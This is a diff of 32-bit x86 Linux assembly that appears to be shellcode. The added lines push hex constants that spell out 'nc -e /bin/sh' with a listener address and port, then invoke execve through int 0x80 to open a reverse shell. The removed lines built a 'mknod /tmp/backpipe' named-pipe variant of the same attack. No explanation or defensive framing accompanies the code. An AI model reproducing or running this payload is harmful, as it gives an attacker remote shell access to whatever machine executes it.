@@ -1,25 +1,21 @@
-.text
-
 .globl _start
 
 _start:
-	push %ebp
-	mov %esp, %ebp
-	sub $0x80, %esp
-	//mov %ebp, %esp
-	//sub 
-	xor %eax,%eax
-	//xor %esp, %esp
+	xor %eax, %eax
 	push %eax
-	push $0x70206370
-	push $0x622f706d
-	push $0x742f2064
-	push $0x6f6e6b6d
+	push $0x20303434
+	push $0x3420332e
+	push $0x36352e38
+	push $0x36312e32
+	push $0x39312068
+	push $0x732f6e69
+	push $0x622f2065
+	push $0x2d20636e
 	push %eax
-	push $0x5663702D
+	push $0x7663622d
 	push %eax
-	push $0x68732f6e
-	push $0x69622f2f
+	push $0x68732f2f
+	push $0x6e69622f
 	mov %esp, %esi
 	mov %esi, %ebx
 	push %eax
@@ -31,7 +27,5 @@ _start:
 	push %esi
 	mov %esp, %ecx
 	xor %edx, %edx
-   	movb $11, %al       
-   	int  $0x80              
-   	leave
-   	ret
+	mov $11, %al
+	int $0x80
